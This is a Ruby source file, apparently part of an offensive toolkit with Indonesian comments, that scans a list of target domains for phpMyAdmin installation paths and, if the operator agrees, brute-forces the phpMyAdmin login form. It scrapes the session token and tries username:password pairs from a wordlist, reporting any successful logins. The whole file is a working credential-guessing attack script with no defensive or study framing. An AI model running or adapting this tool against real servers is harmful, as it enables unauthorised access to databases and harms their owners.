module Phpmyadmin

	class Scanner

		def initialize()
			if system("gedit " + 'wordlists/domain_target.txt') == true
				print "- You want to login with bruteforce? (Y/N or y/n) : "
				opt = gets.chomp
				wl 			= File.readlines('wordlists/domain_target.txt')
				wl_count 	= 0..wl.size.to_i - 1
				wl_count.each_with_index do |x|
					url = wl[x].gsub("\n","")
					puts "==================================================================".white
					puts "- #{url}" + " processing...".yellow
					begin
						_main_(url,opt)
					rescue Exception => e
						puts "- " + e.message.yellow
					end
				end
			end
		end

		def _main_(urip,opt)
			if IPVALID.new.check_ip(urip) == true # Cek Jika memasukan IP Address
				ip = urip
			else
				url = urip.gsub(/^https?\:\/\/(www.)?|\//,'')
				ip = IPSocket::getaddress(url)
			end

			if /https/.match(urip)
				uri_scheme = 'https'
			else
				uri_scheme = 'http'
			end

			lines = File.readlines('wordlists/pagelist_phpmyadmin.txt')

			if opt == 'Y' || opt == 'y'
				execution(ip,lines,uri_scheme,opt)
			elsif opt == 'N' || opt == 'n'
				execution(ip,lines,uri_scheme,opt)
			else
				puts 'You can type N or Y'
			end
		end

		def execution(ip,lines,uri_scheme,opt_bf)
			filepath = 'logs/phpmyadmin_'+ ip +'.log'
			# Hapus file log jika sudah ada
			LOG.new.delete(filepath)

			for i in 0..lines.size.to_i - 1
				target 		= "#{uri_scheme}://#{ip}/#{lines[i].chomp}/"
				response 	= run_curl("GET", target, uri_scheme, lines[i])

				output = "[ #{response.code} ] #{target}"

				if response.code == '200' || response.code == '301'
					puts "- ............... #{output}".green
					LOG.new.create(filepath,output)
					if opt_bf == 'Y' || opt_bf == 'y'
						run_bruteforce("POST", target, uri_scheme, lines[i], response.body, ip)
					end
				elsif response.code == '404'
					puts "- ............... #{output}".yellow
				else
					puts "- ............... #{output}".black
				end
			end
		end

		def run_curl(method_req, target, uri_scheme, line, pma_username = nil, pma_password = nil, token = nil, ip = nil)
			uri  = URI(target)
			http = Net::HTTP.new(uri.host, uri.port)
			if uri_scheme == 'https'
				http.use_ssl = true
			end

			if method_req == 'GET'
				return http.request(Net::HTTP::Get.new(uri))
			else
				response = Net::HTTP::post_form(uri + 'index.php', "pma_password" => pma_password, "pma_username" => pma_username, "server" => 1, "target" => "index.php", "token" => token)
				return response
				# case response
				# when Net::HTTPSuccess then
				# 	return response
				# when Net::HTTPRedirection then
				# 	return http.request(Net::HTTP::Get.new("#{uri_scheme}://#{ip + response['location']}"))
				# else
				# 	return response
				# end
			end
		end

		def run_bruteforce(method_req, target, uri_scheme, line, response_body, ip)
			sc 		= response_body.scan(/name="token" value="([a-z0-9A-Z]+)"/)
			wl 		= File.readlines('wordlists/wl_phpmyadmin.txt')
			count 	= wl.size.to_i

			for i in 0..count - 1
				splt 	= wl[i].split(':')
				response = run_curl(method_req, target, uri_scheme, line, splt[0], splt[1], sc[0], ip)
				if response.body.match('Access denied') != nil
					puts "- #{splt[0]}|#{splt[1]} => Username or password incorrect".red
				elsif response.body.match('Login') != nil || response.body.match('Log in') != nil
					puts "- #{splt[0]}|#{splt[1]} => Back to login response".red
				else
					puts "- #{splt[0]}|#{splt[1]} => Login successfull".green
				# LOG.new.create("logs/#{i}.html",response.body)
				# puts response.body
				end
				# LOG.new.delete("logs/#{i}.html")
			end
		end

	end # End Class

end # End Module